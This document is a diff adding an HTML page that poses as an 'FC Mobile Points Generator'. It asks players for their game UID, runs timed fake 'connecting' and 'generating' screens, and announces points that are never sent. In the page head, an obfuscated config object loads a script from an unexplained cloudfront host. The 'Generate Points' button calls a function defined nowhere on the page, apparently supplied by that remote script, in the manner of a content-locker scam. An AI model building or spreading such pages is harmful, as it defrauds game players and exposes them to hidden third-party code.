@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script type="text/javascript">
+        var teooj_cAw_XHkcWc={"it":4517896,"key":"01ffe"};
+    </script>
+    <script src="https://dlk457skl57zp.cloudfront.net/105f86b.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FC Mobile Points Generator</title>
+    <!-- Tailwind CSS for styling -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts: Inter -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        /* Custom styles for the page */
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #111827; /* Dark blue-gray background */
+            background-image: radial-gradient(circle at top right, rgba(16, 185, 129, 0.1), transparent 40%),
+                              radial-gradient(circle at bottom left, rgba(59, 130, 246, 0.1), transparent 40%);
+        }
+
+        /* Custom animation for the spinner */
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .spinner {
+            animation: spin 1s linear infinite;
+        }
+
+        /* Custom transition for step visibility */
+        .step {
+            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out;
+            will-change: opacity, transform;
+        }
+        
+        .step.hidden {
+            position: absolute;
+            opacity: 0;
+            transform: translateY(20px);
+            pointer-events: none;
+        }
+
+        /* Hide scrollbar but allow scrolling */
+        .no-scrollbar::-webkit-scrollbar {
+            display: none;
+        }
+        .no-scrollbar {
+            -ms-overflow-style: none; /* IE and Edge */
+            scrollbar-width: none;   /* Firefox */
+        }
+        
+        /* Offer button styling */
+        .offer {
+            transition: all 0.3s ease-in-out;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <div class="main-card bg-gray-900/50 backdrop-blur-xl border border-gray-700/50 rounded-2xl shadow-2xl w-full max-w-md mx-auto overflow-hidden">
+        <!-- Banner Section (Static) -->
+        <div id="banner-section">
+            <div class="banner relative">
+                <img class="w-full h-32 object-cover" src="https://cdn.cloudflare.steamstatic.com/steam/apps/2195250/header.jpg" alt="FC Mobile Banner">
+                <div class="absolute inset-0 bg-gradient-to-t from-gray-900 via-gray-900/70 to-transparent"></div>
+                <div class="absolute inset-0 flex items-end p-4">
+                    <img class="w-16 h-16 rounded-xl border-2 border-gray-700 shadow-lg" src="https://play-lh.googleusercontent.com/EizXC9yDmo3ccsp-32abm1ffsjZTdLJEEd9tRKDLN_Y37SJWdmpdfjtLIJAF_HQMGQ=w240-h480-rw" alt="EA Logo">
+                    <div class="ml-4">
+                        <h1 class="text-white text-2xl font-extrabold tracking-tight">FC MOBILE</h1>
+                        <p class="text-emerald-400 text-sm font-semibold">POINTS GENERATOR</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Step Container -->
+        <div class="relative p-6 sm:p-8">
+            <!-- Step 1: UID Input -->
+            <div id="step-1" class="step w-full">
+                <h2 class="text-xl font-bold text-white text-center mb-2">Start Your Journey</h2>
+                <p class="text-gray-400 text-center mb-6">Enter your FC Mobile UID to connect your account.</p>
+                <div class="w-full">
+                    <label class="text-gray-300 font-medium mb-2 block" for="uid-input">Your UID</label>
+                    <input id="uid-input" class="w-full bg-gray-800 border-2 border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500 transition-all" type="text" maxlength="16" placeholder="e.g., 123456789012" autocomplete="off">
+                </div>
+                <button onclick="goToStep(2)" class="w-full bg-emerald-500 hover:bg-emerald-600 text-white font-bold py-3 px-4 rounded-lg mt-6 shadow-lg shadow-emerald-500/20 hover:shadow-emerald-600/30 transition-all duration-300 transform hover:scale-105">
+                    Connect Account
+                </button>
+            </div>
+
+            <!-- Step 2: Choose Points -->
+            <div id="step-2" class="step hidden w-full">
+                <h2 class="text-xl font-bold text-white text-center mb-2">Select Points</h2>
+                <p class="text-gray-400 text-center mb-6">Choose the amount of points you want to generate.</p>
+                <div class="grid grid-cols-2 gap-4 w-full">
+                     <button class="coin-btn group" onclick="selectCoins(this, 50000)">
+                        <span class="text-lg font-bold text-white">50,000</span>
+                        <span class="text-sm text-gray-400 group-hover:text-emerald-400">Points</span>
+                    </button>
+                    <button class="coin-btn group" onclick="selectCoins(this, 150000)">
+                        <span class="text-lg font-bold text-white">150,000</span>
+                        <span class="text-sm text-gray-400 group-hover:text-emerald-400">Points</span>
+                    </button>
+                    <button class="coin-btn group" onclick="selectCoins(this, 300000)">
+                        <span class="text-lg font-bold text-white">300,000</span>
+                        <span class="text-sm text-gray-400 group-hover:text-emerald-400">Points</span>
+                    </button>
+                    <button class="coin-btn group" onclick="selectCoins(this, 750000)">
+                        <span class="text-lg font-bold text-white">750,000</span>
+                        <span class="text-sm text-gray-400 group-hover:text-emerald-400">Points</span>
+                    </button>
+                </div>
+                <button id="coins-btn" onclick="_yk()" class="w-full bg-emerald-500 text-white font-bold py-3 px-4 rounded-lg mt-6 shadow-lg shadow-emerald-500/20 transition-all duration-300 disabled:bg-gray-600 disabled:cursor-not-allowed disabled:shadow-none" disabled>
+                    Generate Points
+                </button>
+            </div>
+
+            <!-- Step 4: Success Message -->
+            <div id="step-4" class="step hidden w-full text-center py-8">
+                 <div class="w-20 h-20 bg-emerald-500/10 rounded-full flex items-center justify-center mx-auto mb-4 border-2 border-emerald-500">
+                    <svg class="w-10 h-10 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                </div>
+                <h2 class="text-2xl font-bold text-white mb-2">Generation Complete!</h2>
+                <p class="text-gray-300">Your <strong id="final-points" class="text-emerald-400"></strong> Points have been sent. It may take a few minutes to reflect in your account.</p>
+            </div>
+
+            <!-- Loading Spinner (Overlay) -->
+            <div id="loading" class="step hidden w-full flex-col items-center justify-center py-16">
+                 <div class="spinner w-12 h-12 border-4 border-gray-600 border-t-emerald-500 rounded-full"></div>
+                 <p id="loading-text" class="text-white font-semibold mt-4">Connecting...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- State Management ---
+        let userUID = '';
+        let selectedPoints = 0;
+        let currentStep = 1;
+
+        // --- DOM Elements ---
+        const steps = [1, 2, 4].reduce((acc, n) => ({ ...acc, [n]: document.getElementById(`step-${n}`) }), {});
+        const loadingScreen = document.getElementById('loading');
+        const loadingText = document.getElementById('loading-text');
+        const uidInput = document.getElementById('uid-input');
+        const coinsBtn = document.getElementById('coins-btn');
+
+        /**
+         * Hides all steps and shows the target step with a transition.
+         * @param {number} stepNumber - The step number to show.
+         */
+        function showStep(stepNumber) {
+            Object.values(steps).forEach(step => step.classList.add('hidden'));
+            loadingScreen.classList.add('hidden');
+            
+            if (steps[stepNumber]) {
+                steps[stepNumber].classList.remove('hidden');
+                currentStep = stepNumber;
+            }
+        }
+
+        /**
+         * Shows the loading screen with a specific message.
+         * @param {string} text - The text to display below the spinner.
+         */
+        function showLoading(text) {
+             Object.values(steps).forEach(step => step.classList.add('hidden'));
+             loadingText.textContent = text;
+             loadingScreen.classList.remove('hidden');
+        }
+
+        /**
+         * Main navigation logic between steps.
+         * @param {number} nextStep - The step to navigate to.
+         */
+        function goToStep(nextStep) {
+            if (nextStep === 2) { // From UID to Points Selection
+                const uid = uidInput.value.trim();
+                if (uid.length < 5) {
+                    uidInput.classList.add('border-red-500', 'animate-pulse');
+                    setTimeout(() => uidInput.classList.remove('animate-pulse'), 1500);
+                    return;
+                }
+                uidInput.classList.remove('border-red-500');
+                userUID = uid;
+                showLoading('Connecting to account...');
+                setTimeout(() => showStep(2), 2000);
+            }
+        }
+
+        /**
+         * Handles the selection of a points amount.
+         */
+        function selectCoins(btn, amount) {
+            document.querySelectorAll('.coin-btn').forEach(b => {
+                b.classList.remove('border-emerald-500', 'bg-emerald-500/10', 'ring-2', 'ring-emerald-500');
+                b.classList.add('bg-gray-800', 'border-gray-700');
+            });
+            btn.classList.add('border-emerald-500', 'bg-emerald-500/10', 'ring-2', 'ring-emerald-500');
+            btn.classList.remove('bg-gray-800', 'border-gray-700');
+
+            selectedPoints = amount;
+            coinsBtn.disabled = false;
+        }
+        
+        /**
+         * Runs the final activation step.
+         */
+        function runActivation() {
+            showLoading('Generating points...');
+            setTimeout(() => {
+                // Setup success message before showing
+                document.getElementById('final-points').textContent = new Intl.NumberFormat().format(selectedPoints);
+                showStep(4);
+            }, 3000);
+        }
+
+        /**
+         * Initializes the page on load.
+         */
+        function initialize() {
+            // Style coin buttons dynamically
+            document.querySelectorAll('.coin-btn').forEach(button => {
+                button.classList.add('bg-gray-800', 'border-2', 'border-gray-700', 'rounded-lg', 'p-4', 'flex', 'flex-col', 'items-center', 'justify-center', 'cursor-pointer', 'transition-all', 'duration-300', 'hover:border-emerald-500', 'hover:bg-gray-800/50');
+            });
+            // Show the first step
+            showStep(1);
+        }
+
+        document.addEventListener('DOMContentLoaded', initialize);
+    </script>
+</body>
+</html>
